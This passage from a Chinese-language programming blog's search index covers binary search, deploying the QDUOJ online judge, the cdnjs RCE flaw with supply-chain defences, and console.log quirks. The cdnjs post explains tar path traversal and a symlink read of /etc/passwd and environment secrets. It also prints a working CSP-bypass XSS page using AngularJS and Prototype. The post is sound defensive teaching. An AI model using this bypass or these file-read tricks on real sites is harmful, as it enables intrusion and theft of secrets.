1; &#125; &#125; // 在答案範圍內用線性搜尋 for(var i=R; i>=L; i--)&#123; if(array[i]&lt;target)&#123; return i; &#125; &#125; &#125; 就算條件變得不一樣，例如說要找：&gt;=target, &lt;target 等等的，只要改一下條件，用差不多的架構就可以得到解答 結論其實原本我是想好好研究一下在不同狀況下的二分搜，那些條件到底要怎麼訂，有沒有什麼統一的規則可以參考但最後覺得還是文末給出的解法最方便，不但好想，而且還好寫不用去顧慮那些&lt;&gt;&#x3D;的符號跟+1-1的問題，在執行效率上也差不多 在演算法這一塊我也不是專業的，若是文章之中有哪部分有錯的話，還麻煩各位前輩指正 &lt;(_ _)&gt; 最後附上不嚴謹的測試與各種版本的 JavaScript 程式碼：https://repl.it/DgDU/1","link":"/2016/09/23/binary-search-introduction/"},{"title":"自己架一個 Online Judge 系統","text":"前言先稍微介紹一下什麼是 Online Judge（底下簡稱 OJ）系統，簡單來說就是像 leetcode 那樣啦，可以送出程式碼解題，然後讓系統去批改，並且得到最後的結果。底下是 leetcode 的截圖： 在 leetcode 流行以前，最知名的 OJ 大概就是 UVa Online Judge，俗稱 ACM，而台灣的話應該就是 ZeroJudge 比較有名。 如果剛好有需求，想要自己架一個 OJ 的話，該怎麼辦呢？ 開源 OJ 系統在網路上搜尋一下，可以找到幾個開源的 OJ 系統，其中星星數比較多看起來也比較穩定的是底下三個： DMOJ NOJ QDUOJ DMOJ 這一套功能看起來最豐富最完整，而且支援的語言最多，可以到 60 幾種！而且還支援 Google, Facebook, Github 這些第三方登入。後端是 Python 寫的，而且一直持續有在維護，文件也滿完整的。 唯一的缺點大概就是介面比較陽春一點，沒那麼討喜。 NOJ 中國南京郵電大學開源出來的系統，是用 Laravel 寫成的。介面使用 Material UI，看起來比較現代，但是文件比較不完整。 QDUOJ中國青島大學開源出來的，後端是 Python + Django，前端是 Vue，採用 docker 部署簡單快速，支援的程式語言有：C, C++, Java 跟 Python。介面的部分則是使用 Ant Design。 想要架哪一套就是根據自己需求而定，如果 GitHub 上提供的文件完整的話，照著做就行了。若是不完整也可以透過 Issue 提問，英文不好的話也不需要太過擔心，這三個 repo 用中文應該也都可以通。 而我最後選擇的是最後一套，青島大學開源出來的 OJ。會選這一套是因為介面我滿喜歡的，然後是這三套裡面部署最容易的一套。 部署流程在這邊：https://github.com/QingdaoU/OnlineJudgeDeploy/tree/2.0 ，因為是採用 docker 部署，所以真的容易，基本上就是把 docker-compose.yml 拉下來然後跑個指令就搞定了。 我們可以來看一下 docker-compose.yml 的內容： version: &quot;3&quot; services: oj-redis: image: redis:4.0-alpine container_name: oj-redis restart: always volumes: - .&#x2F;data&#x2F;redis:&#x2F;data oj-postgres: image: postgres:10-alpine container_name: oj-postgres restart: always volumes: - .&#x2F;data&#x2F;postgres:&#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data environment: - POSTGRES_DB&#x3D;onlinejudge - POSTGRES_USER&#x3D;onlinejudge - POSTGRES_PASSWORD&#x3D;onlinejudge judge-server: image: registry.cn-hangzhou.aliyuncs.com&#x2F;onlinejudge&#x2F;judge_server container_name: judge-server restart: always read_only: true cap_drop: - SETPCAP - MKNOD - NET_BIND_SERVICE - SYS_CHROOT - SETFCAP - FSETID tmpfs: - &#x2F;tmp volumes: - .&#x2F;data&#x2F;backend&#x2F;test_case:&#x2F;test_case:ro - .&#x2F;data&#x2F;judge_server&#x2F;log:&#x2F;log - .&#x2F;data&#x2F;judge_server&#x2F;run:&#x2F;judger environment: - SERVICE_URL&#x3D;http:&#x2F;&#x2F;judge-server:8080 - BACKEND_URL&#x3D;http:&#x2F;&#x2F;oj-backend:8000&#x2F;api&#x2F;judge_server_heartbeat&#x2F; - TOKEN&#x3D;CHANGE_THIS # - judger_debug&#x3D;1 oj-backend: image: registry.cn-hangzhou.aliyuncs.com&#x2F;onlinejudge&#x2F;oj_backend container_name: oj-backend restart: always depends_on: - oj-redis - oj-postgres - judge-server volumes: - .&#x2F;data&#x2F;backend:&#x2F;data environment: - POSTGRES_DB&#x3D;onlinejudge - POSTGRES_USER&#x3D;onlinejudge - POSTGRES_PASSWORD&#x3D;onlinejudge - JUDGE_SERVER_TOKEN&#x3D;CHANGE_THIS # - FORCE_HTTPS&#x3D;1 # - STATIC_CDN_HOST&#x3D;cdn.oj.com ports: - &quot;0.0.0.0:80:8000&quot; - &quot;0.0.0.0:443:1443&quot; 可以看到背後分成 4 個 services：Redis、Postgres、judge-server 跟 oj-backend。 不過我當時的需求還有一個，那就是要支援 JavaScript。為了達成這個目標，只有部署是不夠的，還要來研究一下它到底是怎麼跑的。 進一步研究 QDUOJ首先我們來看一下這個系統的架構，在 GitHub 的文件上有寫底下一共分成幾個模組： Backend(Django): https://github.com/QingdaoU/OnlineJudge Frontend(Vue): https://github.com/QingdaoU/OnlineJudgeFE Judger Sandbox(Seccomp): https://github.com/QingdaoU/Judger JudgeServer(A wrapper for Judger): https://github.com/QingdaoU/JudgeServer 而我們最關心的問題（如何新增語言），已經有人在 Issue 裡問過了：How to add more language support, such as Ruby 裡面提到只要修改這個檔案即可：https://github.com/QingdaoU/OnlineJudge/blob/master/judge/languages.py 這檔案就是一些設定，而這邊你也可以大概猜出 Judge Server 會做什麼事情。在這裡，每個語言的設定都會有 compile_command 跟 command，前者是來拿編譯的指令，後者是拿來跑程式的指令。由於這個 OJ 的輸出入都是透過 stdin&#x2F;stdout，所以當你想要新增一種新的程式語言的時候，只要跟系統說該怎麼去執行就好。 相反地，有些 OJ 是採用 function 的方式來填空，例如說開頭提到的 leetcode，這時候若是要新增一個語言就會比較麻煩一些，因為你要額外再提供 function 的模板。 照理來說我們只要再如法泡製，加上這樣的設定就行了： js_lang_config = &#123; \"run\": &#123; \"exe_name\": \"solution.js\", \"command\": \"/usr/bin/nodejs &#123;exe_path&#125;\", \"seccomp_rule\": \"general\", &#125; &#125; 但若是這樣去跑，會發現有問題，搜了一下發現已經有人反映過：problem with addding js to language configs，解法是把 seccomp_rule 設成 None。 什麼是 seccomp 呢？這就跟 OJ 的原理有關了！大家可以先仔細想想 OJ 中最重要的一個問題： 要如何安全地執行使用者提交的程式碼？ 若是不知道這問題是在問什麼，可以想像以下情形： 有人寫了一行重開機的程式碼怎麼辦？ 有人寫了一個無窮迴圈怎麼辦？ 有人寫了一個會把主機帳號密碼傳送到外部的程式怎麼辦？ 由此可以看出，執行程式碼可沒有那麼簡單，而這塊也是 OJ 最核心的一部分。 QDUOJ 的 Judger 原始碼在這邊：https://github.com/QingdaoU/Judger/tree/newnew/src 是用 C 寫的，會 fork 一個新的 process，設定一些規則之後用 execve 來執行指令。在程式碼裡面也可以看出是使用 seccomp 這個東西來防止我們上面所提到的內容。 總之呢，QDUOJ 分層做得很不錯，執行流程大概是這樣的： 進入 Vue 做的前端頁面 送出程式碼，call 後端 API（Python） 後端 API 再呼叫 Judge Server API（Go） Judge Server API 呼叫 Judger 執行指令（C，execve + seccomp 執行） 所以每一個專案負責自己的事項，各司其職。 再講回來前面提到要加上 JavaScript 這一塊，儘管把 seccomp_rule 設成 None 以後，執行 JavaScript 依然會出現錯誤。我研究了一兩天，發現問題是出在題目的記憶體限制太小，我猜測是 Node.js 要執行時本來就會吃比較多記憶體，只要把記憶體改大（例如說 1024MB）就搞定了。 不過還沒結束，還有最後一個問題，那就是 ubuntu 16.04 上的 Node.js 版本滿舊的，要換成新的才能使用 ES6 那些語法，解法是去改 JudgeServer 的 Dockerfile，新增一個安裝 Node.js 新版的指令就好。 都改完以後，就可以來部署自己的版本了！只要先把 docker image build 好，然後更改我們最前面操作的 docker-compose 檔案就可以了。 雖然說上面講的雲淡風輕，但那時候我在找 Node.js 到底為什麼會一直 Runtime error 的時候找到快崩潰，因為錯誤訊息滿不明確的，我一直以為是指令有錯，是後來我才靈機一動想說：「咦，該不會是其他問題吧」，才發現是記憶體問題。 總而言之呢，如果你沒有想要改東西，只是單純想要部署的話，在這邊誠心推薦 QDUOJ，部署真的簡單方便，介面也好看。 自己寫一個 OJ以前我也曾經嘗試過寫一個 OJ，寫是寫出來了，但是是非常陽春的版本：https://lidemy-oj.netlify.com/problems 那時候還沒想到用 linux 上的指令來跑，而是因為恰巧發現有 VM2 這個 library，覺得派得上用場，才有了寫這個簡易 OJ 的念頭。 這個簡單的 OJ 只支援 JavaScript，而且是走 leetcode 那種寫 function 的方式而不是標準輸出入，花了一點時間就把 Judger 的雛形寫了出來： const &#123;VM&#125; = require('vm2'); const lodash = require('lodash') const RESULT_CODE = &#123; AC: 'AC', WA: 'WA', CE: 'CE', RE: 'RE', TLE: 'TLE' &#125; class Judge &#123; constructor(schema, functionCode, timeout = 3000) &#123; this.schema = schema this.functionCode = functionCode this.vm = new VM(&#123; timeout, sandbox: &#123; __equal: lodash.isEqual &#125; &#125;); &#125; t(any) &#123; return JSON.stringify(any) &#125; addWrapper(schema, code, testCase) &#123; return ` $&#123;code&#125; (() => __equal($&#123;schema.funcName&#125;.apply(null, $&#123;this.t(testCase.input)&#125;), $&#123;this.t(testCase.output)&#125;))() ` &#125; runTest(testCase) &#123; try &#123; this.vm.run(this.functionCode) &#125; catch(e) &#123; return RESULT_CODE.RE &#125; const wrapperedCode = this.addWrapper(this.schema, this.functionCode, testCase) try &#123; return this.vm.run(wrapperedCode) ? RESULT_CODE.AC: RESULT_CODE.WA &#125; catch(e) &#123; return e.message === 'Script execution timed out.' ? RESULT_CODE.TLE : RESULT_CODE.WA console.log('err', e) &#125; &#125; run() &#123; const testCases = this.schema.testCases const testResult = testCases.map(testCase => this.runTest(testCase)) const correctCount = testResult.reduce((sum, res) => sum + (res === 'AC'), 0) return &#123; score: Math.ceil(correctCount * ( 100 / testResult.length )), result: testResult &#125; &#125; &#125; const test1 = &#123; input: [1, 2], output: 3 &#125; const test2 = &#123; input: [2, 4], output: 6 &#125; const problemSchema = &#123; funcName: 'add', testCases: [test1, test2] &#125; const input = `function add(a, b)&#123; return 3 &#125;` const judge = new Judge(problemSchema, input) const result = judge.run() console.log(result) 重點程式碼是 addWrapper 跟 runTest，在 addWrapper 裡面去執行傳進來的 function code，然後把結果跟 output 做比對，就會回傳 true 或是 false，代表匹配成功或者是失敗，就可以知道答案是不是對的。 然後 problemSchema 是題目的格式，要有一個 funcName 跟 testCases，每一個測資底下都有 input 與 output。藉由以上程式碼，就可以實作出一個 JS function-base 的超簡易 Judger。 不過這個 Judger 缺點很多，而且跟上面提到的執行指令方式根本沒得比。 我後來在研究資料的時候找到一些不錯的開源解法，以後有人想要自己寫的話可以參考考。 第一個是 IOI 開源出來的 sandbox：isolate，可以安全地執行指令。 第二個更神奇，直接給你 Judge 的 API，而且是免費的：Judge0 API。只要按照他的格式把輸入傳進去，就會跟你說判題結果，所以連 Judge Server 都可以不用自己做。 總結之前想要來架個 OJ，所以找了滿多資料，而碰到最大的問題是：「我想要一個支援 JavaScript 的 OJ」，因為滿多都不支援的。後來無奈之下只好自己寫了一個，就是上面提到的用 JS 寫出來的小玩具。雖然說還堪用，但其實許多功能都不完整，就真的只支援最簡單的答題而已。 一直到今年一月，想要來弄個真正的 OJ，原本也一度考慮要不要自己寫，後來想說太麻煩了，不如找現成的來改，把 JS 的支援加上去。雖然一樣有碰到一些問題，但很幸運地最後還是成功了。 最後的成果在這邊：https://oj.lidemy.com/ 這個 OJ 是為了搭配我最新出的免費線上課程：[ALG101] 先別急著寫 leetcode，是一堂給初學者的課，希望能藉由一系列簡單的題目把基礎打好，培養程式思維能力，有興趣的朋友們可以來看看。","link":"/2020/03/23/build-your-own-online-judge-system/"},{"title":"從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦","text":"前言Supply chain attack，中文翻成供應鏈攻擊，這個手法瞄準了上游的漏洞進行攻擊，因為只要污染了上游，下游也會一併被污染。 以前端為例，你使用的 npm 套件或是程式碼中引入的第三方 script，這些就叫做「上游」，在使用這些第三方資源的同時，你有意識到這也伴隨了一定的風險嗎？ 這篇文章會以 cdnjs 為例，帶大家看看前端的供應鏈攻擊與防禦。 cdnjs在寫前端的時候，常常會碰到許多要使用第三方 library 的場合，例如說 jQuery 或者是 Bootstrap 之類的（前者在 npm 上每週 400 萬次下載，後者 300 萬次）。先撇開現在其實大多數都會用 webpack 自己打包這點不談，在以往像這種需求，要嘛就是自己下載一份檔案，要嘛就是找現成的 CDN 來載入。 而 cdnjs 就是其中一個來源，它的官網長這樣： 除了 cdnjs，也有其他提供類似服務的網站，例如說在 jQuery 官網上可以看見他們自己的 code.jquery.com ，而 Bootstrap 則是使用了另一個叫做 jsDelivr 的服務。 舉個實際的例子吧！ 假設我現在做的網站需要用到 jQuery，我就要在頁面中用 &lt;script&gt; 標籤載入 jQuery 這個函式庫，而這個來源可以是： 我自己的網站 jsDelivr: https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js cdnjs: https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js jQuery 官方：https://code.jquery.com/jquery-3.6.0.min.js 假設我最後選擇了 jQuery 官方提供的網址，就會寫下這一段 HTML： &lt;script src=\"https://code.jquery.com/jquery-3.6.0.min.js\">&lt;/script> 如此一來，就載入了 jQuery 這個函式庫，其他程式碼就可以使用它所提供的功能。 那為什麼我要選擇 CDN，而不是選擇下載下來，放在自己的網站上呢？可能有幾個理由： 懶惰，直接用別人的最快 預算考量，放別人網站可以節省自己網站流量花費跟負荷 速度考量 第三點速度考量值得特別說明一下，如果載入的函式庫是來自於 CDN，下載的速度可能會比較快。 比較快的第一個理由是他們本來就是做 CDN 的，所以在不同國家可能都有節點。假設你主機放在美國，那若是放自己網站，台灣的使用者就要連到美國的伺服器去抓這些 library，但如果是用 CDN 提供的網址，可能只要連到台灣的節點就好，省去一些延遲（latency）。 第二個理由是如果大家都在用這個 CDN，那它被快取住的機率就提高了。例如說，假設 Facebook 也用了 cdnjs 來載入 jQuery 3.6.0 版，那如果我的網站也用了同樣的服務載入了同個 library，對於造訪過 Facebook 的瀏覽器來說，它就不需要再次下載檔案，因為已經下載過，被快取住了。 （2021-08-09 補充：感謝 Ho Hong Yip 於文章發出後在臉書前端社群的指正，現在的瀏覽器對於快取多加了一個限制，也就是跨網站（更詳細一點說是根據 eTLD+1 來判斷）的快取將會分開。所以就算 Facebook 已經載入 jQuery 3.6.0，使用者造訪你的網站時還是需要再下載一次。更詳細的介紹可以看這篇：Gaining security and privacy by partitioning the cache。如此一來，好像又少了一個用 public CDN 的理由了？但文末有提到 Web Shared Libraries 想解決這個問題，只是看起來還在早期階段。） 以大家熟悉的 iT 邦幫忙網站為例，就有使用到來自於 google 跟 cdnjs 的資源： 前面講了一些使用第三方 CDN 的優點，那缺點是什麼呢？ 第一個缺點是如果 CDN 掛了，你的網站可能會跟著一起掛，就算不是掛掉，連線緩慢也是一樣。例如說我網站從 cdnjs 載入了 jQuery，可是 cdnjs 突然變得很慢，那我的網站也會變得很慢，一起被牽連。 而 cdnjs 背後的公司 Cloudflare 確實有出過事，連帶影響了許多網站。 第二個缺點是如果 CDN 被駭客入侵了，你引入的函式庫被植入惡意程式碼，那你的網站就會跟著一起被入侵。而這樣子的攻擊手法，就是這篇的主題：「供應鏈攻擊」，從上游入侵，連帶影響到下游。 有些人可能會想說：「這些大公司不太可能被入侵吧？而且這服務這麼多人用，一定有人在把關吧」 接著，就讓我們來看一個實際案例。 解析 cdnjs 的 RCE 漏洞2021 年 7 月 16 號，一名資安研究員 @ryotkak 在他的部落格上發布了一篇文章，名為：Remote code execution in cdnjs of Cloudflare（以下用「作者」來稱呼）。 Remote code execution 簡稱為 RCE，這種漏洞可以讓攻擊者執行任意程式碼，是風險等級很高的漏洞。而作者發現了一個 cdnjs 的 RCE 漏洞，若是有心利用這個漏洞的話，可以控制整個 cdnjs 的服務。 作者的部落格文章把過程寫得十分詳細，我在這邊簡單講一下漏洞是怎麼形成的，一共有兩個漏洞。 首先呢，Cloudflare 有把 cdnjs 相關的程式碼開源在 GitHub 上面，而其中有一個自動更新的功能引起了作者的注意。這個功能會自動去抓 npm 上打包好的 package 檔案，格式是壓縮檔 .tgz，解壓縮之後把檔案做一些處理，複製到合適的位置。 而作者知道在 Go 裡面如果用 archive/tar 來解壓縮的話可能會有漏洞，因為解壓縮出來的檔案沒有經過處理，所以檔名可以長得像是這樣：../../../../../tmp/temp 長成這樣有什麼問題呢？ 假設今天你有一段程式碼是複製檔案，然後做了類似底下的操作： 用目的地 + 檔名拼湊出目標位置，建立新檔案 讀取原本檔案，寫入新檔案 如果目的地是 /packages/test，檔名是 abc.js，那最後就會在 /packages/test/abc.js 產生新的檔案。 這時候若是目的地一樣，檔名是 ../../../tmp/abc.js，就會在 /package/test/../../../tmp/abc.js 也就是 /tmp/abc.js 底下寫入檔案。 因此透過這樣的手法，可以寫入檔案到任何有權限的地方！而 cdnjs 的程式碼就有類似的漏洞，能夠寫入檔案到任意位置。如果能利用這漏洞，去覆蓋掉原本就會定時自動執行的檔案的話，就可以達成 RCE 了。 當作者正想要做個 POC 來驗證的時候，突然很好奇針對 Git 自動更新的功能是怎麼做的（上面講的關於壓縮檔的是針對 npm 的） 而研究過後，作者發現關於 Git repo 的自動更新，有一段複製檔案的程式碼，長這個樣子： func MoveFile(sourcePath, destPath string) error &#123; inputFile, err := os.Open(sourcePath) if err != nil &#123; return fmt.Errorf(\"Couldn't open source file: %s\", err) &#125; outputFile, err := os.Create(destPath) if err != nil &#123; inputFile.Close() return fmt.Errorf(\"Couldn't open dest file: %s\", err) &#125; defer outputFile.Close() _, err = io.Copy(outputFile, inputFile) inputFile.Close() if err != nil &#123; return fmt.Errorf(\"Writing to output file failed: %s\", err) &#125; // The copy was successful, so now delete the original file err = os.Remove(sourcePath) if err != nil &#123; return fmt.Errorf(\"Failed removing original file: %s\", err) &#125; return nil &#125; 看起來沒什麼，就是複製檔案而已，開啟一個新檔案，把舊檔案的內容複製進去。 但如果這個原始檔案是個 symbolic link 的話，就不一樣了。在繼續往下之前，先簡單介紹一下什麼是 symbolic link。 Symbolic link 的概念有點像是以前在 Windows 上看到的「捷徑」，這個捷徑本身只是一個連結，連到真正的目標去。 在類 Unix 系統裡面可以用 ln -s 目標檔案 捷徑名稱 去建立一個 symbolic link，這邊直接舉一個例子會更好懂。 我先建立一個檔案，內容是 hello，位置是 /tmp/hello。接著我在當前目錄底下建立一個 symbolic link，指到剛剛建立好的 hello 檔案：ln -s /tmp/hello link_file 接著我如果印出 link_file 的內容，會出現 hello，因為其實就是在印出 /tmp/hello 的內容。如果我對 link_file 寫入資料，實際上也是對 /tmp/hello 寫入。 再來我們試試看用 Node.js 寫一段複製檔案的程式碼，看看會發生什麼事： node -e 'require(\"fs\").copyFileSync(\"link_file\", \"test.txt\")' 執行完成之後，我們發現目錄底下多了一個 test.txt 的檔案，內容是 /tmp/hello 的檔案內容。 所以用程式在執行複製檔案時，並不是「複製一個 symbolic link」，而是「複製指向的檔案內容」。 因此呢，我們剛剛提到的 Go 複製檔案的程式碼，如果有個檔案是指向 /etc/passwd 的 symbolic link，複製完以後就會產生出一個內容是 /etc/passwd 的檔案。 我們可以在 Git 的檔案裡面加一個 symbolic link 名稱叫做 test.js，讓它指向 /etc/passwd，這樣被 cdnjs 複製過後，就會產生一個 test.js 的檔案，而且裡面是 /etc/passwd 的內容！ 如此一來，就得到了一個任意檔案讀取（Arbitrary File Read）的漏洞。 講到這邊稍微做個總結，作者一共找到兩個漏洞，一個可以寫檔案一個可以讀檔案，寫檔案如果不小心覆蓋重要檔案會讓系統掛掉，因此作者決定從讀檔案開始做 POC，自己建了一個 Git 倉庫然後發佈新版本，等 cdnjs 去自動更新，最後觸發檔案讀取的漏洞，在 cdnjs 發布的 JS 上面就可以看到讀到的檔案內容。 而作者讀的檔案是 /proc/self/environ（他本來是想讀另一個 /proc/self/maps），這裡面有著環境變數，而且有一把 GitHub 的 api key 也在裡面，這把 key 對 cdnjs 底下的 repo 有寫入權限，所以利用這把 key，可以直接去改 cdnjs 或是 cdnjs 網站的程式碼，進而控制整個服務。 以上就是關於 cdnjs 漏洞的解釋，想看更多技術細節或是詳細發展的話，可以去看原作者的部落格文章，裡面記錄了許多細節。總之呢，就算是大公司在維護的服務，也是有被入侵的風險存在。 而 Cloudflare 也在一週後發佈了事件處理報告：Cloudflare’s Handling of an RCE Vulnerability in cdnjs，記錄了事情發生的始末以及事後的修補措施，他們把整個架構都重寫了，把原本解壓縮的部分放到 Docker sandbox 裡面，增加了整體的安全性。 身為前端工程師，該如何防禦？那我們究竟該如何防禦這類型的漏洞？或搞不好，我們根本防禦不了？ 瀏覽器其實有提供一個功能：「如果檔案被竄改過，就不要載入」，這樣僅管 cdnjs 被入侵，jQuery 的檔案被竄改，我的網站也不會載入新的 jQuery 檔案，免於檔案污染的攻擊。 在 cdnjs 上面，當你決定要用某一個 library 的時候，你可以選擇要複製 URL 還是複製 script tag，若是選擇後者，就會得到這樣的內容： &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js\" integrity=\"sha512-TS4lzp3EVDrSXPofTEu9VDWDQb7veCZ5MOm42pzfoNEVqccXWvENKZfdm5lH2c/NcivgsTDw9jVbK+xeYfzezw==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"> &lt;/script> crossorigin=&quot;anonymous&quot; 這個我在之前的文章：利用 Cookie 特性進行的 DoS 攻擊：Cookie 炸彈有提過，利用 CORS 的方式送出 request，可以避免把 cookie 一起帶到後端去。 而上面的另一個標籤 integrity 才是防禦的重點，這個屬性會讓瀏覽器幫你確認要載入的資源是否符合提供的 hash 值，如果不符合的話，就代表檔案被竄改過，就不會載入資源。所以，就算 cdnjs 被入侵了，駭客替換掉了我原本使用的 react.js，瀏覽器也會因為 hash 值不合，不會載入被污染過的程式碼。 想知道更多的話可以參考 MDN，上面有一頁 Subresource Integrity 專門在講這個。 不過這種方法只能防止「已經引入的 script」被竄改，如果碰巧在駭客竄改檔案之後才複製 script，那就沒有用了，因為那時候的檔案已經是竄改過的檔案了。 所以如果要完全避免這個風險，就是不要用這些第三方提供的服務，把這些 library 放到自己家的 CDN 上面去，這樣風險就從第三方的風險，變成了自己家服務的風險。除非自己家的服務被打下來，不然這些 library 應該不會出事。 而現在許多網站因為 library 都會經由 webpack 這類型的 bundler 重新切分，所以沒有辦法使用第三方的 library CDN，一定會放在自己家的網站上，也就排除了這類型的供應鏈攻擊。 可是要注意的是，你仍然避免不了其他供應鏈攻擊的風險。因為儘管沒有用第三方的 library CDN，還是需要從別的地方下載這些函式庫對吧？例如說 npm，你的函式庫來源可能是這裡，意思就是如果 npm 被入侵了，上面的文件被竄改，還是會影響到你的服務。這就是供應鏈攻擊，不直接攻擊你，而是從其他上游滲透進來。 不過這類型的風險可以在 build time 的時候透過一些靜態掃描的服務，看能不能抓出被竄改的檔案或是惡意程式碼，或也有公司會在內部架一個 npm registry，不直接與外面的 npm 同步，確保使用到的函式庫不會被竄改。 額外風險：CSP 的繞過除了上面提到的供應鏈安全風險以外，其實使用第三方 JS 還有另一個潛在風險，就是 CSP(Content Security Policy) 的繞過。現在有許多網站都會設置 CSP，阻擋不信任的來源，例如說只允許某個 domain 的 JS 檔案，或是不開放 inline event 跟 eval 等等。 如果你的網站有用到 cdnjs 的腳本，你的 CSP 裡面勢必會有 https://cdnjs.cloudflare.com 這個網址。比起完整的路徑，比較多人會傾向允許整個 domain 的東西，因為你可能用到多個 library，懶得一個一個新增上去。 這時候若是網站有著 XSS 漏洞，一般情況下 CSP 應該會有防禦作用，阻止這些不信任的程式碼的執行。但很遺憾地，CSP 中 https://cdnjs.cloudflare.com 的這個路徑，讓攻擊者可以輕鬆繞過 CSP。 先講一下原理，原理就是 cdnjs 上除了你想要用的 library 之外，還有千千萬萬個不同的 library，而有些 library 本身提供的功能，讓攻擊者不需要執行 JS，也能執行任意程式碼。 例如說 AngularJS，在舊版本中有著 Client-Side Template Injection 的漏洞，只需要 HTML 就可以執行程式碼，像是這類「利用其他合法的 script 幫助你執行攻擊程式碼」的手法，叫做 script gadgets，想知道更多可以參考：security-research-pocs&#x2F;script-gadgets 假設我們現在的 CSP 只允許 https://cdnjs.cloudflare.com，該怎麼繞過呢？我找到這兩個很棒的資源： Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup H5SC Minichallenge 3: “Sh＊t, it’s CSP!” 只要利用 AngularJS + Prototype 這兩個 library，就可以在符合 CSP（只引入 cdnjs 底下的腳本）的情況下進行 XSS，我做了一個簡單的 demo：https://aszx87410.github.io/demo/csp_bypass/cdnjs.html 完整程式碼如下： &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>CSP bypass&lt;/title> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src https://cdnjs.cloudflare.com\"> &lt;/head> &lt;body> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> &#123;&#123;$on.curry.call().alert('xss')&#125;&#125; &lt;/div> &lt;/body> &lt;/html> 想要避免這種 CSP bypass，就只能把 CSP 中 cdnjs 的路徑寫死，把整個腳本的 URL 寫上去，而不是只寫 domain。否則，這類型的 CSP 其實會幫助攻擊者更容易突破 CSP 的限制，進而執行 XSS 攻擊。 總結攻擊手法千千百百種，發現 cdnjs 漏洞的研究員近期鍾情於 supply chain attack，不只 cdnjs，連 Homebrew 跟 PyPI 甚至是 @types 也都被找到漏洞。 如果要直接在頁面上用 script 引入第三方的網址，記得先確認對方的網站是值得信任的，如果可以的話也請加上 integrity 屬性，避免檔案被竄改，連帶影響到自己的服務。也要注意 CSP 的設定，對於 cdnjs 這種網站，若是只設置 domain 的話，已經有了可行的繞過手法，在設置前請多加注意。 在談到前端的安全時，大家第一個會想到 XSS，第二個會想到 CSRF，然後可能就沒了。這篇文章希望藉由 cdnjs 的漏洞讓前端工程師們認識什麼是供應鏈攻擊。只要有意識到這個攻擊手法，日後在開發時就會多留意一些，就會注意到引入第三方 library 所帶來的風險。","link":"/2021/08/22/cdnjs-and-supply-chain-attack/"},{"title":"你需要注意的 console.log 問題","text":"前言會寫這篇是因為我相信一定很多人都碰到過這個問題，簡單一句話總結就是：「用console.log 印出物件時，印出的值跟想像中不一樣」，我們來看看底下的程式碼： var obj = &#123;value: 'before'&#125; console.log('before:', obj) // 應該要是 &#123;value: 'before'&#125; obj.value = 'after' console.log('after:', obj) 這是一段很簡單的程式碼，log 出一個 object，改變某個屬性，然後再 log 一次。理所當然地，預期第一個 log 的結果會是：before: &#123;value: &#39;before&#39;&#125;，第二個 log 應該要是：after: &#123;value: &#39;after&#39;&#125;。 可是呢，現實與你想像的不太一樣。實際情況是： 如果你先執行這段程式碼才打開 console，很有可能看到第一個 log 出來的結果是&#123;value: &#39;after&#39;&#125;，而不是&#123;value: &#39;before&#39;&#125; 如果先把 console 打開才執行，儘管乍看之下是對的，但如果你點開 console 裡面 object 的詳細資料，你會看到 &#123;value: &#39;after&#39;&#125;，如下圖，接著開始懷疑人生，不知道該相信誰。 不相信的話可以自己試試看：Demo 連結 在查看 log 的時候，開發者應該會預期看到 log 當時的狀態，但是點開物件詳細資料的時候，看到的卻會是最新的狀態，而非印出當時的狀態。所以才會有上面附圖的狀況，preview 顯示的是 log 當下的狀態，展開則是最新的狀態，所以兩者不一致。 有些人可能會認為如果 preview 都是對的，那就看 preview 就好。不過 preview 是有限制的，當你的物件太多屬性的時候，沒有辦法全部顯示出來，一定要把物件展開才能看到所有屬性。一旦這種情況發生，就沒辦法只看 preview，一定要把物件展開，可是就沒辦法看到 log 當下的值了。 這只是一個簡單的範例而已，或許你會覺得沒什麼，但是這問題可怕的點就在於第一次碰到它時，往往都是在實際的開發情境而不是像這樣簡單的範例。而開發者們會因為不知道有這個情形，導致自己不斷思考到底程式是哪裡出了錯，怎麼印出來的東西跟自己想像中不一樣，殊不知是 console 這東西跟自己想的不一樣。 這個問題基本上「不會被修掉」，所以對待它最好的方法就是： 知道有這個問題的存在，以後才能多注意 知道如何暫時應付這個問題 知道為什麼這問題不會被修掉 再次觀察問題前面開頭有提到過可能會出現的兩個問題，接著我們來試試看各個瀏覽器對於兩個不同場景底下的結果到底如何。 先附上拿來測試的範例程式碼： var obj = &#123;value: 'before'&#125; console.log('before:', obj) // 應該要是 &#123;value: 'before'&#125; obj.value = 'after' console.log('after:', obj) 場景一：先執行這一段程式碼，再打開 console 看結果 場景二：先打開 console，再執行程式碼看結果 底下是在 macOS Mojave 10.14.4 的各個瀏覽器的執行結果： Chrome 80.0.3987.149場景一：先執行程式再開 console只顯示 Object 字樣，不顯示 preview： 場景二：先開 console 再執行程式console preview 印出來的內容是對的，把 object 展開之後則印出物件最新的內容。 Firefox 74.0場景一：先執行程式再開 console顯示錯誤的 preview，兩個都是 &#123;value: &#39;after&#39;&#125;： 場景二：先開 console 再執行程式console preview 印出來的內容是對的，把 object 展開之後則印出物件最新的內容。 Safari 12.1（14607.1.40.1.4）場景一：先執行程式再開 console只顯示 Object 字樣，不顯示 preview： 場景二：先開 console 再執行程式console preview 印出來的內容是對的，把 object 展開之後則印出物件最新的內容。 附註：因為物件如果太短的話不能展開，所以我新增了幾個屬性 從以上實驗可以得到幾個結論： 對於場景一：「先執行程式再開 console」，Chrome 與 Safari 都不會有 preview，而 Firefox 會顯示錯誤的 preview。 對於場景二：「先開 console 再執行程式」，三個瀏覽器的行爲是一致的，preview 都是對的，把物件展開看詳細內容則會是物件最新的狀態。 問題發生的原因這個問題其實很久以前就存在了，在好幾年前就已經有 Stackoverflow 的討論串了： Google Chrome console.log() 